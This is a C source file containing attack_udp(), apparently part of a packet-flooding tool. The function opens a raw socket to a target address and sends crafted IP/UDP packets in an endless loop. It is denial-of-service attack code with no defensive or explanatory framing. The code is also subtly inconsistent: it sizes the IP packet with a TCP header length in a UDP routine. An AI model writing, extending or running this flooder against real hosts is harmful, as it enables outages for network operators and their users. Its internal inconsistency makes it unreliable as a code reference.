#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "udp_attack.h"
#include "packet.h"
#include "utils.h"
#include "types.h"

void attack_udp(struct target_data *target)
{
	char buffer[BUFFER_SIZE];
	struct ip_hdr *iph = (struct ip_hdr *)buffer;
	struct udp_hdr *udph = (struct udp_hdr *)(buffer + sizeof(struct ip_hdr));

	seed_rand(time(NULL));

	target->addr.sin_family = AF_INET;
	target->addr.sin_port = 0;
	target->addr.sin_addr.s_addr = target->target_addr;
	target->sockfd = init_socket(IPPROTO_UDP);

	while (1) {
		build_ip(iph, sizeof(struct ip_hdr) + sizeof(struct tcp_hdr),
			IPPROTO_UDP, target->target_addr);
		build_udp(iph, udph);

		if (sendto(target->sockfd, buffer, iph->length, 0,
				(struct sockaddr *)&target->addr,
				sizeof(struct sockaddr_in)) == -1) {
			exit(EXIT_FAILURE);
		}
	}
}
